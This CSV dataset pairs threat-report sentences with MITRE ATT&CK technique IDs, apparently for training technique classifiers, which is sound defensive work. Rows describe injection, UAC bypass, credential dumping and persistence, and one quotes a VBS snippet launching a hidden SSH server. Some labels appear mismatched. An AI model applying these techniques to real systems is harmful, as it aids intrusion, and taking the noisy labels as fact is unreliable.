text,label
utilizes  to help propagate itself across a network.,T1569.002
"In at least some of these recent attacks, Buckeye used spear-phishing emails with a malicious .zip attachment",T1566.001
has written its payload into a newly-created `EhStorAuthn.exe` process using `ZwWriteVirtualMemory` and executed it using `NtQueueApcThread` and `ZwAlertResumeThread`.,T1055
has dropped payload and configuration files to disk.  has also been used to download and execute additional payloads.(Citation: TrendMicro PE_URSNIF.A2),T1105
has exploited CVE-2014-4076 CVE-2015-2387 CVE-2015-1701 CVE-2017-0263 to escalate privileges.(Citation: Bitdefender APT28 Dec 2015)(Citation: Microsoft SIR Vol 19),T1068
has used been observed deleting scripts once used.,T1070.004
can collect system information including computer name system manufacturer IsDebuggerPresent state and execution path.,T1082
has embedded  within another run-only .,T1027
has edited variable names within the Impacket suite to avoid automated detection.,T1027
has deobfuscated base64-encoded commands following the execution of a malicious script which revealed a small script designed to obtain an additional payload. ,T1140
staging a credential theft capability in the LSASS process itself by abusing native Windows capabilities,T1003.001
can download additional components from the C2 server.,T1105
hide a second stage payload in registry transaction files,T1112
has injected code into a selected process which in turn launches a command as a child process of the original.,T1055
has used Base64 to encode malicious links.  has also delivered compressed payloads in ZIP files to victims.(Citation: Threatpost Hancitor),T1027
 searches for the Kubernetes config file and other related files using a regular expression. ,T1083
makes their malware look like Flash Player Office or PDF documents in order to entice a user to click on it.,T1204.002
has the ability to download additional payloads from C2 to the targeted system.,T1105
"In the order to run the SSH server, the attackers created a VBS file with the following content: Set WshShell = CreateObject(“WScript.Shell”) WshShell.CurrentDirectory = “C:\WINDOWS\TEMP\Dropbear\” WshShell.Run “dropbear.exe -r rsa -d dss -a -p 6789”, 0, false As is evident here, the SSH server will accept connections on port number 6789",T1547.001
has dropped legitimate software onto a compromised host and used it to execute malicious DLLs.,T1055
The injected process,T1055
has targeted victims with spearphishing emails containing malicious attachments.(Citation: Security Affairs DustSquad Oct 2018),T1566.001
downloader to the compromised device that executes and downloads the primary payload.,T1105
"use WMI to persist a backdoor and also store
the PowerShell backdoor code.",T1047
can list running processes.,T1057
has used various batch scripts to establish C2 and download additional files. 's backdoor malware has also been written to a batch file.(Citation: Palo Alto Gamaredon Feb 2017)(Citation: ESET Gamaredon June 2020)(Citation: CERT-EE Gamaredon January 2021),T1059.003
using the API NtRaiseHardError,T1106
has encrypted strings.(Citation: Objective See Green Lambert for OSX Oct 2021) ,T1027
has a keylogging capability.,T1056.001
has the ability to identify the username on the compromised host.,T1033
starts a hidden file in the directory,T1564.001
has placed scripts in the startup folder for persistence and modified the `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce` Registry key.(Citation: Securelist Kimsuky Sept 2013)(Citation: CISA AA20-301A Kimsuky)(Citation: Crowdstrike GTR2020 Mar 2020)(Citation: Talos Kimsuky Nov 2021),T1547.001
"Once the second DLL is executed, it gathers information about the victim system’s setup, such as operating system version, and driver and processor information",T1082
has impersonated the legitimate goopdate.dll which was dropped on the target system with a legitimate GoogleUpdate.exe.,T1036.005
can capture screenshots of the victims machines.,T1113
can launch a remote command shell interface for executing commands.,T1059.003
has been used to run the whoami command on the system.,T1033
has the ability to list running processes on a compromised host.,T1057
", it extracts, decrypts, and decompresses the data to be executed as shellcode.",T1140
scanned the Program Files directories for a directory with the string Total Security (the installation path of the 360 Total Security antivirus tool).,T1518.001
Inveigh ,T1557.001
NetServerGetInfoto retrieve the current configuration,T1106
has used various tools to steal files from the compromised host.(Citation: Symantec Chafer February 2018),T1005
has used weaponized documents in e-mail to compromise targeted systems.(Citation: Proofpoint Operation Transparent Tribe March 2016)(Citation: Kaspersky Transparent Tribe August 2020)(Citation: Talos Oblique RAT March 2021)(Citation: Talos Transparent Tribe May 2021),T1204.002
"command pulls down a Visual Basic script, drops it into the C:\Windows\Tasks folder, and executes it.",T1105
In one version of  string obfuscation routines were used to hide many of the critical values referenced in the malware.,T1027
has used UPX packers for its payload DLL.,T1027
The threat actor was observed deleting files that had been dropped to disk,T1027
"PowerShell to connect to third-party file sharing
sites to download the UltraVNC application",T1105
It then sets registry entries,T1112
used a cloud-based remote access software called LogMeIn for their attacks.,T1219
has created staging folders in directories that were infrequently used by legitimate users or processes.,T1074.001
can identify the IP of a targeted system.,T1016
17 Complete List of Malware Files  Fig,T1083
The macro contains malicious code that attempts to download content from a remote server,T1105
encoded the two inject.bin and imain.bin payloads.,T1027
can be executed via scheduled tasks.,T1053.005
"once decrypted, contained the C2 domains for additional malicious artifacts.",T1140
can use Registry Run Keys for persistence.,T1547.001
was installed under names that resembled legitimate Windows file and directory names.(Citation: Symantec RAINDROP January 2021),T1036.005
Encrypting communications using AES and RSA public key cryptography,T1573.001
is capable of deleting the backdoor file.,T1070.004
"To decode this information, BADNEWS takes the following steps:  Base64-decode the string Perform the decoding cipher used in previous versions Base64-decode the result Decrypt the result using the Blowfish algorithm and a static key  A script, which is included in the Appendix, will decrypt data from these dead drop resolvers",T1140
has obfuscated malware and malicious scripts to help avoid detection.,T1027
manipulating of registry keys,T1112
has encrypted configuration files.(Citation: TrendMicro Tropic Trooper Mar 2018),T1027
The method InjectAssembly is used to inject a .NET assembly into a native process,T1055
the user the threat actor used to RDP,T1021.001
Legitimate accounts obtained by the attackers can be used to ensure persistence in the compromised infrastructure.,T1078
has exploited known vulnerabilities in public-facing infrastructure such as Microsoft Exchange Servers.,T1190
obtained information about the configured Exchange virtual directory using Get-WebServicesVirtualDirectory.,T1083
"The two "".bat"" files that were sent",T1059.003
has modified registry keys using the reg windows utility for its custom backdoor implants.,T1112
contains a collection of ScriptModification modules that compress and encode scripts and payloads.(Citation: GitHub PowerSploit May 2012),T1027
can create a service to establish persistence.,T1543.003
has used DLL side-loading to launch versions of Mimikatz and PwDump6 as well as .(Citation: PWC Cloud Hopper Technical Annex April 2017)(Citation: FireEye APT10 Sept 2018),T1574.002
writes data into the Registry key HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Pniumj.,T1112
uses an AES CBC (256 bits) encryption algorithm for its loader and configuration files.,T1027
can make a direct SQL connection to a Microsoft database controlled by the attackers retrieve an item from the bindata table then write and execute the file on disk.,T1105
be based on an encryption algorithm used previously in,T1027
normal protocol uses raw TCP sockets and a custom message format,T1095
resulted in confirmed compromises of internet-facing Federal Government agency systems.,T1190
Several  backdoors achieved persistence by adding a Run key.,T1547.001
It checks running processes,T1057
During  threat actors used domain accounts to gain further access to victim systems.,T1078
has the ability to upload files from a targeted system.,T1005
has created payloads in the Startup directory to maintain persistence. ,T1547.001
remote desktop protocol (RDP) and secure shell (SSH) accesses,T1021.001
uses an encrypted file to store commands and configuration values.,T1140
has dropped  under the `svchost.exe` name to disk.,T1036.005
has collected files from a local victim.,T1005
has used cmd.exe to execute commands.,T1059.003
has used spearphishing emails with malicious DOC attachments.,T1566.001
"Open directory listing of hxxp://stevemike-fireforce[.]info/ Based on the contents and structure of the initial identified open directories, it was possible to find several infrastructure patterns in use",T1083
can gather information on the victim IP address.,T1016
Get list of drives,T1083
tools decrypted additional payloads from the C2.  has also decoded base64-encoded source code of a downloader.(Citation: TrendMicro Gamaredon April 2020),T1140
"using FindFirstFileW, FindNextFileW, and FindClose APIs",T1083
has 2 methods for elevating integrity. It can bypass UAC through `eventvwr.exe` and `sdclt.exe`.,T1548.002
has used image files to hide its loader component.,T1027
"and finds the trust relationships and jump hosts, attempting to move into the other domains and security zones.",T1078
DLL that decodes and drops three files,T1140
has been spread via e-mail campaigns utilizing malicious attachments.(Citation: Unit 42 NETWIRE April 2020),T1566.001
has used WMI to execute commands.,T1047
can obtain a list of users from an infected machine.,T1033
harvests credentials using Invoke-Mimikatz or Windows Credentials Editor (WCE).,T1003.001
can enumerate registry keys.(Citation: ESET Sednit Part 2),T1012
decrypting and executing the shellcode,T1140
has performed process name checks and has monitored applications. ,T1057
can search for anti-virus software running on the system.,T1518.001
It then adds the extensions such as exe and DLL as exclusions to Windows Defender.,T1562.001
can gather system information from a compromised host.,T1082
has used HKLM\SOFTWARE\Microsoft\CurrentVersion\Run to establish persistence.,T1547.001
"Upon execution, the ransomware binary deletes itself",T1070.004
uses HTTP and HTTPS for command and control.,T1071.001
has used a dynamic XOR key and custom XOR methodology for C2 communications. ,T1573.001
has used C:\Windows\Debug and C:\Perflogs as staging directories.(Citation: FireEye Periscope March 2018),T1074.001
Computer name,T1082
can modify file attributes to hide files.,T1564.001
Screenshot grab,T1113
uses HTTP and HTTPS for command and control.(Citation: F-Secure The Dukes),T1071.001
obtains the victim username and encrypts the information to send over its C2 channel.,T1033
can use HTTP to download shellcode from compromised websites.,T1071.001
keylogging,T1056.001
The activity thereafter included dumps of LSASS,T1003.001
has exploited unpatched vulnerabilities on internally accessible servers including JIRA GitLab and Confluence for privilege escalation.,T1068
has used HTTP to communicate with C2 nodes.,T1071.001
has used HTTPS for C2.(Citation: TrendMicro Ursnif Mar 2015)(Citation: FireEye Ursnif Nov 2017),T1071.001
cyber actors were observed Base64 encoding files and command strings to evade security measures.,T1027
Contain an encrypted .NET injector and one or more encrypted PE payloads.,T1027
The  group is known to utilize WMI for lateral movement.,T1047
can hide its payload in BMP images hosted on compromised websites.,T1027
several POST requests,T1071.001
can send C2 communications with XOR encryption.,T1573.001
has used  and a custom tool SecHack to harvest credentials. ,T1003.001
has created scheduled tasks for persistence.(Citation: FireEye APT39 Jan 2019)(Citation: BitDefender Chafer May 2020),T1053.005
has disguised a file as a Linux kernel module.,T1036.005
"the initial vector used by the threat actor was a zip file, which included a malicious JavaScript file, delivered through a phishing campaign.",T1566.001
The threat actor installed Atera and Splashtop remote access software,T1219
has the ability to unpack itself into memory using XOR.(Citation: Sogeti CERT ESEC Babuk March 2021),T1140
has searched folders and subfolders for files to encrypt.,T1083
can delete scripts from a subdirectory of /tmp after they are run.,T1070.004
uses module networkDll for process list discovery.(Citation: ESET Trickbot Oct 2020),T1057
subsequently download Remcos on the target system,T1105
can collect information from a compromised host.,T1005
the malware enumerates the running processes on the system and compiles a list of process names and IDs.,T1057
"The malware then appends a script extension (php, bml, or cgi) with a random number of random parameters or a file extension from the following list with no parameters: gif, jpg, png, htm, html, php",T1083
has exploited CVE-2017-0005 for local privilege escalation.,T1068
sent emails to victims with malicious Microsoft Office documents attached.,T1566.001
has used various Windows API functions including `DeviceIoControl` as part of its encryption process.,T1106
malicious oci.dll into the service’s executable,T1569.002
“cmd” /c,T1059.003
has been distributed via spearphishing as an email attachment.,T1566.001
Those files will later be sent to the malware C2 server,T1041
can store its encryption key in the Registry.,T1112
malleable C2 profiles are configured to allow domain fronting using the Fastly and AzureEdge CDNs,T1090
C:\Windows\system32\cmd.exe /C,T1059.003
NavRAT is able to download and execute files located in the attachment of a received email,T1105
"From an infrastructure point of view there is no overlap between the two sets of activity, the only overlap is the use of the unique tool “DNSMessenger”  When these points are considered together in conjunction with the significant difference in targeting they make a strong case for classifying this activity as distinct from FIN7 activity",T1562.001
has searched compromised systems for folders of interest including those related to HR audit and expense and meeting memos.,T1083
can launch itself from a hollowed svchost.exe process.(Citation: Secureworks BRONZE PRESIDENT December 2019)(Citation: Trend Micro DRBControl February 2020),T1055
saves a screen capture of the victim's system with a numbered filename and .jpg extension. Screen captures are taken at specified intervals based on the system. ,T1113
WMIC,T1047
stealing credentials from the Local Security Authority Subsystem Service (LSASS) process.,T1003.001
has the ability to decrypt strings encrypted with the Rijndael symmetric encryption algorithm.,T1140
was decoded using a custom rolling XOR algorithm to execute a customized  payload.(Citation: FireEye SUNBURST Backdoor December 2020)(Citation: Check Point Sunburst Teardrop December 2020),T1140
has checked the OS version using `wmic.exe` and the `find` command.,T1082
has obfuscated strings in  by base64 encoding and then encrypting them.,T1027
decrypts that specific payload code,T1140
has used HTTP for C2.,T1071.001
The fernet_decrypt function decrypts an encrypted string,T1140
During  threat actors used domain credentials including domain admin for lateral movement and privilege escalation.,T1078
has achieved execution by luring users to click on a file that appeared to be an Adobe Flash Player update installer. ,T1204.002
requires the user to double-click the executable to run the malicious HTA file or to download a malicious installer.(Citation: FireEye Metamorfo Apr 2018) ,T1204.002
may use stolen legitimate accounts specified in the configuration data.,T1078
has exploited CVE-2021-1732 for privilege escalation.(Citation: DBAPPSecurity BITTER zero-day Feb 2021),T1068
Firewall rules have occasionally been seen being disabled as well.,T1562.001
it was executed using a command line argument,T1059.003
That node contains the encoded payload.,T1027
can enumerate directories on a compromise host.,T1083
A threat actor could establish an administrator session,T1078
used a backdoor NESTEGG that has the capability to download and upload files to and from a victims machine.,T1105
uses Rundll32 to load a malicious DLL.,T1218.011
installer contains a malicious file named navlu.dll to decrypt and run the RAT. navlu.dll is also the name of a legitimate Symantec DLL.,T1036.005
WMI was used for running commands on remote systems,T1047
can be used to decompress a local or remote CAB file into an executable.,T1140
"We found a brute-force tool called NLBrute , with configuration files that tell us it had been set up to use an included set of username and passwords to try to break in to machines that have Remote Desktop enabled",T1110
has encrypted strings with a single byte XOR algorithm.,T1027
the encrypted data,T1027
captured screenshots and desktop video recordings.,T1113
"4 Upload edg499.dat, which includes the list of interesting files",T1083
can use RC4 and XOR to encrypt C2 communications.,T1573.001
queries Registry keys in preparation for setting Run keys to achieve persistence.,T1012
unpacking,T1027
can check for existing stratum cryptomining information in HKLM\Software\Microsoft\Windows\CurrentVersion\spreadCpuXmr  %stratum info%.,T1012
itself is obfuscated and uses obfuscated API calls.,T1027
attempts to add a shortcut file in the Startup folder to achieve persistence. If this fails it attempts to add Registry Run keys.(Citation: PWC Cloud Hopper Technical Annex April 2017),T1547.001
"What does the Poseidon Group do? What happens after a target machine is infected? Once the target’s machine is compromised, the attacker first enumerates all processes running in the system and all services",T1057
can enumerate all running processes to compare hashes.,T1057
the embedded DLL,T1027
can load DLLs through vulnerable legitimate executables.,T1574.002
can collect network information including the host IP address DNS and proxy information.,T1016
attempted to get users to launch malicious Microsoft Office attachments delivered via spearphishing emails.,T1204.002
After resolving the functions,T1027
has used Rotate on Right (RoR) and Rotate on Left (RoL) functionality to encrypt strings.,T1027
"By deactivating UAC, the ransomware gets elevated privileges without requiring user permission or administrator credentials",T1548.002
can obtain system information such as OS version and disk space.,T1082
uses  for command and control traffic.,T1090
can use multiple layers of proxy servers to hide terminal nodes in its infrastructure.,T1090
has collected files and other sensitive information from a compromised network.,T1005
can download and execute files.(Citation: jRAT Symantec Aug 2018)(Citation: Kaspersky Adwind Feb 2016),T1105
The  loader has used API calls to spawn `MSBuild.exe` in a suspended state before injecting the decrypted  binary into it.,T1055
communicates over HTTP or HTTPS for C2.,T1071.001
They used multiple malicious PDFs and MS Office documents during the campaign.,T1566.001
"In this particular case in 2013, the config file included an unknown plugin set, aside from the usual ‘ddos’ plugin listing",T1083
can delete its configuration file from the targeted system.,T1070.004
has been delivered via spearphishing emails that contain a malicious Hangul Office or Microsoft Word document.,T1566.001
can inject a suspended thread of its own process into a new process and initiate via the ResumeThread API.,T1055
version of  communicates with their server over a TCP port using HTTP payloads Base64 encoded and suffixed with the string &&&.,T1071.001
can deploy additional tools onto an infected machine.,T1105
makes use of API GetTickCount / QueryPerformanceCounter,T1106
has a command to return a directory listing for a specified directory.,T1083
creates a Registry Run key to establish persistence.(Citation: Zscaler Kasidet),T1547.001
can download files.,T1105
During  threat actors downloaded additional files to the infected system.,T1105
The task’s description is PythonUpdateSrvc and it runs either on Windows startup when a user logs in or when one of two system events get created:,T1053.005
backdoor has modified the Windows Registry to store the backdoor's configuration. ,T1112
can list active processes running on the victims machine.,T1057
The base64-encoded strings were plaintext again in this version.,T1027
can use  to execute a payload on a remote host. It can also use Service Control Manager to start new services.(Citation: cobaltstrike manual),T1569.002
has used implants capable of collecting the signed-in username.,T1033
The attack involved a spear-phishing email with a subject of “Project Offer” and a malicious Word document (SHA256: d393349a4ad00902e3d415b622cf27987a0170a786ca3a1f991a521bff645318) as an attachment,T1566.001
has been used to run the tasklist command on a compromised system.,T1057
"to use WMI for storage and
persistence.",T1047
obtains installer properties from Uninstall Registry Key entries to obtain information about installed applications and how to uninstall certain applications.,T1083
looked for a specific process running on infected servers.,T1057
has collected data from local victim systems.,T1005
produces file listings in order to search for files to be exfiltrated.(Citation: ESET Machete July 2019)(Citation: Cylance Machete Mar 2017),T1083
gathers the victim computer name using the Win32 API call GetComputerName.,T1082
This includes bidirectional file transfers between the C&C and the compromised machine.,T1041
and then downloads a second-stage backdoor from the OpenDrive cloud service.,T1105
to decrypt it using AES GCM algorithm,T1140
"When decoded, the content of the Ir8 variable (a segment of which is shown below) turns out to be just another encoded PowerShell script, which the VBS decodes and then executes.",T1140
Stopping Cisco AMP /  Disabling Microsoft Defender,T1562.001
executes the cmd.exe command.,T1059.003
can download further malware for execution on the victim's machine.,T1105
The body of the POST request may contain files contained in the cabinet format,T1083
"This group was observed using tactics such as registering typosquatting domains for security or technology vendors, abusing open-source penetration testing tools, and leveraging novel file types as anti-analysis techniques",T1518.001
has used Windows Scheduled Tasks to establish persistence on local and remote hosts.,T1053.005
can upload and download to/from a victim machine.,T1105
"searched files on the server, and found plaintext credentials",T1552.001
"MiniDump, “a C# implementation of mimikatz/pypykatz minidump functionality to get credentials from LSASS dumps”",T1003.001
reviewed Group Policy Objects for the domain.,T1484.001
gains access to the targets through remote exploitation of an unpatched internet-facing device.,T1190
can perform keylogging.(Citation: ESET Sednit Part 2),T1056.001
"Screenshots and keylogging are enabled by default,",T1113
can attempt to run the program as admin then show a fake error message and a legitimate UAC bypass prompt to the user in an attempt to socially engineer the user into escalating privileges.,T1548.002
"In reflective PE injection, the PE file is parsed and its sections are reconstructed in the target process’s memory.",T1055
provides command-line access to the compromised system.,T1059.003
an encrypted blob,T1027
Some  samples have a module to extract email from Microsoft Exchange servers using compromised credentials.,T1078
can decrypt strings with a key either stored in the Registry or hardcoded in the code.,T1140
can open a command line to execute commands.,T1059.003
uses an RPC server that contains a routine for file deletion and also removes itself from the system through a DLL export by deleting specific files.,T1070.004
can perform a UAC bypass if it is not executed with administrator rights or if the infected host runs Windows Vista or later.,T1548.002
"credentials are accessed and the target organization has not reset corresponding passwords, the actors can log in with stolen credentials and masquerade as legitimate users,",T1078
can be used to locate certain types of files/directories in a system.(ex: locate all files with a specific extension name and/or age),T1083
has used Apples Core Graphic APIs such as `CGWindowListCreateImageFromArray` to capture the user's screen and open windows.(Citation: ESET DazzleSpy Jan 2022),T1113
Lots of custom scripts dropped by threat actors,T1105
has attempted to stop endpoint detection and response (EDR) tools on compromised systems.,T1562.001
it prompts the user with a fake message to double-click on open to view the attachment.,T1204.002
"Establish a session that originates from a target Workstation system directly to an external host over a clear text protocol, such as HTTP.",T1071.001
CMD-based scripts,T1059.003
downloaded additional tools such as  malware and  to the compromised host following initial compromise.,T1105
has used `cmd.exe` for execution.,T1059.003
has been disguised as legitimate programs such as Java and Telegram Messenger.(Citation: Securelist Octopus Oct 2018),T1036.005
has used HTTP for C2 communications.,T1071.001
the actor executes Cobalt Strike’s built-in Mimikatz to dump its credentials or password hash,T1003.001
can obtain the IP address of a victim host.,T1016
has used cmd.exe and batch scripts to execute commands.,T1059.003
has been delivered via spearphishing attachments disguised as PDF documents.,T1566.001
can enable Windows CLI access and execute files.,T1059.003
has a command to return a list of running processes.,T1057
The decoded DLL,T1140
UAC bypass will be executed via the AppInfo RPC service.,T1548.002
the threat actor installed RSAT (Remote Server Administration Tools) on the beachhead host,T1219
collected system architecture information.  used an HTTP malware variant and a Port 22 malware variant to gather the hostname and CPU information from the victims machine.(Citation: FireEye APT19),T1082
can query HKEY_CURRENT_USER\Software\Microsoft\Office\<Excel Version>\Excel\Security\AccessVBOM\ to determine if the security setting for restricting default programmatic access is enabled.(Citation: Talos Cobalt Strike September 2020),T1012
which in turn injects the payload(s) into its own or a remote process.,T1055
has been seen loaded into msiexec.exe through process hollowing to hide its execution.,T1055
has executed a malicious executable by naming it svchost.exe.,T1036.005
may gather a list of running processes by running tasklist /v.,T1057
has used a file stealer that checks the Document Downloads Desktop and Picture folders for documents and images with specific extensions.,T1083
can execute commands via an interactive command shell.  uses batch scripts for various purposes including to restart and uninstall itself.,T1059.003
has the ability to gather a list of files and directories on the infected system.(Citation: Securelist ScarCruft May 2019)(Citation: NCCGroup RokRat Nov 2018),T1083
the scheduled task,T1053.005
enumerates processes via the tasklist command.,T1057
leveraging Microsoft’s CryptoAPI,T1106
contains a collection of Privesc-PowerUp modules that can query Registry keys for potential opportunities.(Citation: GitHub PowerSploit May 2012),T1012
tries to start its defined shell which has been swapped to a batch script (file2.bat) by the malicious actor.,T1059.003
can use `wmic` to gather information from a system.,T1047
has the ability to capture input on the compromised host via keylogging.,T1056.001
multi-layer obfuscation,T1027
launched a scheduled task to gain persistence using the schtasks /create /sc command.,T1053.005
gathers credentials using  and Procdump. ,T1003.001
C:\Windows\system32\cmd.exe /C,T1059.003
send a list of process names and IDs back to the C2,T1041
started the cryptomining virtual machine as a service on the infected machine.,T1569.002
has deleted files and directories including XML and files successfully uploaded to C2 servers.(Citation: ESET InvisiMole June 2018),T1070.004
cmd /C,T1059.003
which is then injected into svchost and dllhost.,T1055
it will parse the AES IV (Initialization vector) and the encrypted password,T1027
has staged stolen files in the C:\AMD\Temp directory.,T1074.001
deleted installation files after completion.,T1070.004
"In one version of the malware, the code checks if the “ProgramData” folder has folders or files with the keywords “Kasper“, “Panda“, or “ESET“",T1083
can gather information on drives and the operating system on the victims machine.,T1082
*Command_Create&Inject:  This command creates a new process (using a supplied filename as the process name) and then injects malicious code into it,T1055
can modify the victim's anti-virus.(Citation: DigiTrust NanoCore Jan 2017),T1562.001
can add modify and/or delete registry keys. It has changed the proxy configuration of a victim system by modifying the HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap registry.,T1112
can collect local data from an infected machine.,T1005
had the ability to download additional payloads.,T1105
can obtain information about process integrity levels.,T1057
the threat actors who perform brute-force attacks on MS SQL Servers.,T1110
has used XOR with 0x90 to obfuscate its configuration file.,T1027
has used an open source batch script to modify Windows Defender registry keys.,T1112
has used LoadLibrary() GetProcAddress() and CreateRemoteThread() API functions to execute its shellcode.,T1106
creates a base directory that contains the files and folders that are collected.,T1074.001
strings network data configuration and modules are encrypted with a modified RC4 algorithm.  has also been delivered to targets as various archive files including ZIP 7-ZIP and RAR.(Citation: ESET RTM Feb 2017),T1027
most of the connection attempts to the C2 IP’s are conducted over TCP port 443.,T1095
collected and exfiltrated files from the infected system.,T1005
can collect drive information from a compromised host.,T1082
is capable of listing contents of folders on the victim.  also searches for custom network encryption software on victims.(Citation: Symantec Remsec IOCs)(Citation: Kaspersky ProjectSauron Full Report),T1083
"""w.bat"" as viewed through the bash command ""cat"":",T1059.003
contains a module that tries to obtain credentials from LSASS similar to . These credentials are used with  and  to help the malware propagate itself across a network.,T1003.001
can exfiltrate files from local file systems.,T1005
During  threat actors leveraged embedded shellcode to inject a downloader into the memory of Word.  ,T1055
used a backdoor QUICKRIDE to communicate to the C2 server over HTTP and HTTPS.,T1071.001
contains a command to collect information about anti-virus software on the victim.(Citation: Proofpoint Operation Transparent Tribe March 2016),T1518.001
has maintained persistence by placing itself inside the current user's startup folder.,T1547.001
has used AES for encrypting C2 traffic.,T1573.001
can collect host data and specific file types.(Citation: NCCGroup RokRat Nov 2018)(Citation: Volexity InkySquid RokRAT August 2021),T1005
The traffic beaconing contains the following pattern that will be encrypted with the AES key extracted from the compressed blob,T1573.001
can gather system information from the victims machine including the OS type.,T1082
has used the ShellExecute() function within a script.,T1106
creates run key Registry entries pointing to malicious DLLs dropped to disk.,T1547.001
uses the Microsoft  utility to list processes running on systems.,T1057
creates a backdoor through which remote attackers can retrieve information such as computer name OS version processor speed memory size and CPU speed.,T1082
encrypts its C2 configuration files with AES in CBC mode.,T1027
has staged stolen data locally on compromised hosts.,T1074.001
showing the decrypted botpack structure.,T1140
to grab the encoded and encrypted master key,T1027
can download and execute new plugins from the C2 server. (Citation: Prevx Carberp March 2011),T1105
"The autonomous system name of the IP shows that the allocation is controlled by Serverius Holding B.V., which is an autonomous system name we have previously seen associated with the OilRig group",T1082
has the ability to download and install a remote payload.,T1105
func_GetGraphicCards,T1082
has used HTTP for C2 communications.,T1071.001
"It hands over the decrypted buffer extracted from the resource section and the path from the original RegAsm executable to the start_protect_hexcode function.Then it starts the process-hollowing shellcode, which is stored in the HEXCODE1 variable",T1055
first-stage downloader installed  to the startup folder %Startup%\mssync.exe.,T1547.001
has a command to collect the processor type operation system computer name uptime and whether the system is a laptop or PC.,T1082
A closer look at the document reveals the graphical elements are all images placed in a layered style by the malicious actor.,T1027
can use proxies for C2 traffic.(Citation: Objective See Green Lambert for OSX Oct 2021),T1090
has obfuscated macros within malicious documents to hide the URLs hosting the malware CMD.exe arguments and PowerShell scripts. (Citation: Talos Emotet Jan 2019)(Citation: Trend Micro Emotet Jan 2019)(Citation: Picus Emotet Dec 2018),T1027
can gather a list of processes.,T1057
has a command to create set copy or delete a specified Registry key or value.(Citation: ESET InvisiMole June 2018),T1112
uses the command reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\InternetSettings.,T1012
can compress 32-bit and 64-bit driver files with the Lempel-Ziv algorithm.(Citation: Symantec Ukraine Wipers February 2022)(Citation: Crowdstrike DriveSlayer February 2022),T1027
has used  to exploit a domain controller via the ZeroLogon exploit (CVE-2020-1472).,T1210
several Zip Archives files hosting multiple lure documents likely sent via phishing campaigns,T1566.001
can iterate through running processes every six seconds collecting a list of processes to capture from later.,T1057
has used `cmd.exe` for archiving data and deleting files.,T1059.003
Payload decryption function.,T1140
using the functions “SHGetFolderPathlW” and “CreateFileW”,T1106
The ISO file was delivered as a ZIP archive via a malicious spam mail campaign.,T1566.001
The threat actor used a redirector (38.135.122[.]194:8080) to proxy the RDP traffic being passed,T1090
can discover processes on compromised hosts.,T1057
can be used to find information about the operating system.,T1082
is capable of downloading additional files through C2 channels including a new version of itself.(Citation: Forcepoint Monsoon)(Citation: PaloAlto Patchwork Mar 2018),T1105
The payload then uses the MD5 hash (14331d289e737093994395d3fc412afc) of what appears to be a hardcoded SHA1 hash (B6A75B1EF701710D7AEADE0FE93DE8477F3BD506) as an RC4 key to decrypts the resulting decoded data,T1140
has a command to download a file.,T1105
has the ability to determine if the compromised host is running a 32 or 64 bit OS architecture.,T1082
POWRUNER will send the captured screenshot image file to the C2 server if the “fileupload” command is issued,T1113
can search a list of running processes for Tr.exe.,T1057
has collected system name OS version adapter information memory usage and disk information from a victim machine.,T1082
"Mitigation As this sample installs itself through the use of EternalBlue, the targeted protocol is SMB.  Because of this, in order to best mitigate and avoid possible installations, you need your system updated to the latest security patches.  Specifically, you’d want to make sure that you have MS17-010 installed, as this is the security patch that patches the EternalBlue vulnerability",T1518.001
"Windows system WMI data is stored in the WMI common information model (CIM) repository, which consists of several files in the System32\wbem\Repository directory",T1047
has used cmd.exe to execute commands.,T1059.003
has locally staged encrypted archives for later exfiltration efforts.,T1074.001
by modifying the Windows Registry on compromised systems.,T1112
C:\Windows\system32\cmd.exe /c,T1059.003
dumped from an injection into the SearchIndexer process,T1055
WMI classes are the primary structure within WMI,T1047
gathers product names from the Registry key: HKLM\Software\Microsoft\Windows NT\CurrentVersion ProductName and the processor description from the Registry key HKLM\HARDWARE\DESCRIPTION\System\CentralProcessor\0 ProcessorNameString.,T1012
can download additional plugins updates and other files. ,T1105
the given task the downloaded file,T1105
has the ability to add itself to the Registry Run key for persistence.,T1547.001
will perform UAC bypass either through fodhelper.exe or eventvwr.exe.,T1548.002
Self-delete after sending data,T1070.004
Malware used by  attempts to terminate processes corresponding to two components of Sophos Anti-Virus (SAVAdminService.exe and SavService.exe).,T1562.001
actors often use RDP to move laterally across the network,T1021.001
Decrypted payload ,T1140
"the malware initiates a download, which delivers an executable",T1105
